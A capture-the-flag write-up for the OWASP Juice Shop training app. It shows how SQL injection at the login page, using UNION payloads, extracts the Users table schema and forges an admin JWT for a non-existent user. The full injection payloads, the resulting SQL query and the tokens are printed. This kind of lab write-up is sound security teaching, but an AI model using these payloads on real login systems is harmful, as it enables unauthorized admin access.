# Bonus Challenge: Generating a JWT Token for a Non-Existent User With Admin Privileges
*(It's not listed in the scoreboard as of 2019/08/21)*

## Description
I was attempting to complete the [Admin Registration (L3)](../../level-3#admin-registration) challenge, and while attempting that, I discovered a way to generate a JSON Web Token (JWT) for a non-existent user that had admin privileges.

## How?
### 1. Starting with SQL Injection
I was experimenting with SQL injection at the login page of the OWASP Juice Shop, and was looking at trying to log in with my user, but instead of matching my user info that was in the database, I would copy most of that, and change the `isAdmin` flag. The only way I could think to do this was using a `UNION` or `UNION ALL` in my SQL injection.

Early on, I ran into a lot of issues with the columns from the `UNION` not matching up, like below. I don't know the schema at this point (and I'm intentionally not looking it up because I'm trying to emulate an attacker).

<img src="images/nonexistent-user-admin-token-sql-union-error.png">

### 2. Getting the User Table Schema
I found that there was 2 ways get the schema. One of the explicitly tells you the schema, and the other you can infer the schema from.

#### 2a. Explicit: Get the Schema via SQL Injection
So, at this point, I needed to find how to get the schema. The way I initially did it was looking at if I could get the endpoint to output the schema as one of the fields. Since the errors I got were from SQLite, a few quick google searches told me how to [get the columns for a table](https://stackoverflow.com/a/54962853), and [concat them into a single value](https://stackoverflow.com/a/3926380). So, I started with this:

```
' UNION ALL SELECT * FROM (SELECT (SELECT group_concat(name) FROM PRAGMA_TABLE_INFO('Users')), null)--
```

For the one above, I got the column mismatch again, but the syntax was valid and no issues with functions not existing. I kept adding `null`s one at time to the end of it until that didn't happen. Eventually, I got up to 11 `null`s (in addition to the subquery `SELECT`).

**Initial Injection Payload - Column Names**
```
' UNION ALL SELECT * FROM (SELECT (SELECT group_concat(name) FROM PRAGMA_TABLE_INFO('Users')), null, null, null, null, null, null, null, null, null, null, null)--
```

Once I clicked the submit button, I got presenting with a 2FA page. Progress!

<img src="images/nonexistent-user-admin-token-2fa.png">

From there I looked at the token that I got back in the requests, and it was another JWT token.

**2FA JWT Token - Column Names**
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJpZCx1c2VybmFtZSxlbWFpbCxwYXNzd29yZCxpc0FkbWluLGxhc3RMb2dpbklwLHByb2ZpbGVJbWFnZSx0b3RwU2VjcmV0LGlzQWN0aXZlLGNyZWF0ZWRBdCx1cGRhdGVkQXQsZGVsZXRlZEF0IiwidHlwZSI6InBhc3N3b3JkX3ZhbGlkX25lZWRzX3NlY29uZF9mYWN0b3JfdG9rZW4iLCJpYXQiOjE1NjU5Njk1ODEsImV4cCI6MTU2NTk4NzU4MX0.FSDMBOs2C20Eqb-c_PghsbQ7dUiHpwQe5qrLsllp2W41Wg6MVpFXPTMY0gB0HGFI4Deeun6Iw7B5a2yy5Pb339wXfZLCHisXpmfS08i2pxsd_N70wvzqUZtrjALvardSB3_FCh9St1c5oAQOuqlq7EDGvFymFtiPdNz8-4DR6BE
```

Once I decoded it, I found the schema below.

<img src="images/nonexistent-user-admin-token-column-name-token.png">

Neat. Though I realized that the schema it looked EXACTLY like the user data in the a normal JWT token from this application, which brings me to the other way to figure out the schema.

#### 2b. Inference: Look at a Normal JWT Token
In the [Password Strength (L2)](../../level-2#password-strength) challenge, I found the admin account's password in the JWT token, and this is what the JWT token looks like when it is decoded.

**Normal JWT Token for a Logged-In User**
<img src="../../level-2/images/2-admin-password-jwt.png">

Hey, it's literally all of the table fields as the SQL injection way in 2a. Let's move on.

### 3. Generating the Non-Existent User's Token with Admin Privileges

So, at this point, I took the fields in the schema list, and filled them **in the same order** so the `UNION` would match up with the column list from `SELECT * FROM Users` login SQL query. You also need to switch `true` and `false` values to 1 and 0, respectively (but maybe that's a relic from my days using MSSQL). After you update the `isAdmin` value to `1` (or `true`), it should look like this:

**Injection Payload - Generate Admin Token**
```
' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'someone@something.io' as 'email', 'b4448762fc877c2d57b2c9723118d264' as 'password', 1 as 'isAdmin', '172.16.189.1' as 'lastLoginIp' , 'default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '2019-08-16 14:14:41.644 +00:00' as 'createdAt', '2019-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
```

And here is the SQL query that the server will run (formatted and prettified)
```sql
SELECT * 
FROM  users 
WHERE  email = '' 

UNION ALL

SELECT * 
FROM ( 
  SELECT 15                          AS 'id', 
  ''                                 AS 'username', 
  'someone@something.io'             AS 'email', 
  'b4448762fc877c2d57b2c9723118d264' AS 'password', 
  1                                  AS 'isAdmin',
  '172.16.189.1'                     AS 'lastLoginIp' , 
  'default.svg'                      AS 'profileImage', 
  ''                                 AS 'totpSecret', 
  1                                  AS 'isActive', 
  '2019-08-16 14:14:41.644 +00:00'   AS 'createdAt', 
  '2019-08-16 14:33:41.930 +00:00'   AS 'updatedAt', 
  NULL                               AS 'deletedAt'
)
--AND password = 'b4448762fc877c2d57b2c9723118d264' AND deletedAt IS NULL 
```

My injection payload worked! I got to the main search page and I was logged in as my *faux* user. My user did exist at this point, but this all works even if the user does not exist. I took at look at my JWT token in my cookie / application settings.

**Non-Existent User JWT Token**
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJzb21lb25lQHNvbWV0aGluZy5pbyIsInBhc3N3b3JkIjoiYjQ0NDg3NjJmYzg3N2MyZDU3YjJjOTcyMzExOGQyNjQiLCJpc0FkbWluIjp0cnVlLCJsYXN0TG9naW5JcCI6IjE3Mi4xNi4xODkuMSIsInByb2ZpbGVJbWFnZSI6ImRlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDE5LTA4LTE2IDE0OjE0OjQxLjY0NCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE5LTA4LTE2IDE0OjMzOjQxLjkzMCArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE1NjU5NzE5NDcsImV4cCI6MTU2NTk4OTk0N30.OhfHXsnCteRB-LSuTxucIeV59paLJs7gzjqi5DMm0-84UIuvmIXdzChDsLGsfgzYXSxkTwtyzWpla8z-xAsxVnKLiNUr7noQde6yklK8Pw1YXLKFcz2Olga7Yra5ezfIWv3-OxKTUxZgdQsoi7kdOl2wWtH8bJxUXsGUTStkre0
```

Once you decode that token, it looks like this:

<img src="images/nonexistent-user-admin-token-decoded.png">

Boom! I'm an admin that doesn't exist! To finish this off, I went to the administration page to find out if this worked, and it does! Yay!

<img src="images/nonexistent-user-admin-token-admin-page.png">

